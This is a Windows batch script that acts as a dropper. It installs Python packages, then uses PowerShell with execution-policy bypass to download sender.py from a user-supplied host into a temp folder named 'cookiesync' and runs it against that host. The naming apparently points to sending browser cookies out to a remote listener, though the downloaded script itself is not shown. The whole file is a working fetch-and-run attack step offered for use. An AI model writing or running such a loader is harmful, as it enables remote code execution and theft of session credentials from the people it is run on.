@echo off
setlocal
if "%~1"=="" (
  echo usage: fetch_and_run.bat http://DEST_IP:8000 [token]
  exit /b 1
)
set BASE=%~1
set TOK=%~2
set BASE=%BASE:http://=%
set H=%BASE%
set P=8000
echo %BASE% | find ":" >nul && for /f "tokens=1,2 delims=:" %%A in ("%BASE%") do (set H=%%A& set P=%%B)
if "%P%"=="" set P=8000
set Q=
if not "%TOK%"=="" set Q=?t=%TOK%
set TA=
if not "%TOK%"=="" set TA=--token %TOK%

set TMPD=%TEMP%\cookiesync
mkdir "%TMPD%" 2>nul

where py >nul 2>&1 && set PY=py -3
if not defined PY where python >nul 2>&1 && set PY=python
if not defined PY (
  echo Python 3 not found. Install from https://python.org and tick "Add to PATH".
  pause
  exit /b 1
)

%PY% -m pip install -q --disable-pip-version-check requests websocket-client
powershell -NoP -Exec Bypass -c "iwr 'http://%H%:%P%/sender/sender.py%Q%' -OutFile '%TMPD%\sender.py'"
if not exist "%TMPD%\sender.py" (
  echo Could not download sender.py from http://%H%:%P%
  pause
  exit /b 1
)

%PY% "%TMPD%\sender.py" --host %H% --port %P% %TA%
if errorlevel 1 pause